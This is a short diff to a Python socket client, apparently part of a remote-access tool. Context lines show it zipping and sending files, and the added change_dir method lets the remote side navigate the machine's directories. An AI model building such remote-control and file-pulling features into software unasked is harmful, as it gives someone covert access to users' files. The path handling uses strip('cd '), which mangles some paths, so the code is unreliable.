@@ -3,6 +3,7 @@ import os
 import tempfile
 import glob
 import json
+import string
 
 import zipfile
 
@@ -109,6 +110,25 @@ class ClientConnection:
         self.socket.send(file_content+END_DELIMETER.encode())
         os.remove(zipped_name)
 
+    def change_dir(self):
+        curr_dir = os.getcwd()
+        self.send_data(curr_dir)
+        while True:
+
+            command = self.receive_data()
+            if command == "quit" or command == "stop" or command == "exit":
+                print("[-] Exiting menu")
+                break
+            if command.startswith("cd"):
+                path2move = command.strip("cd ")
+                if os.path.exists(path2move):
+                    os.chdir(path2move)
+                    pwd = os.getcwd()
+                    self.send_data(pwd)
+                else:
+                    self.send_data(os.getcwd())
+            else:
+                self.send_data(os.getcwd())
 
     def Close(self):
         self.socket.close()
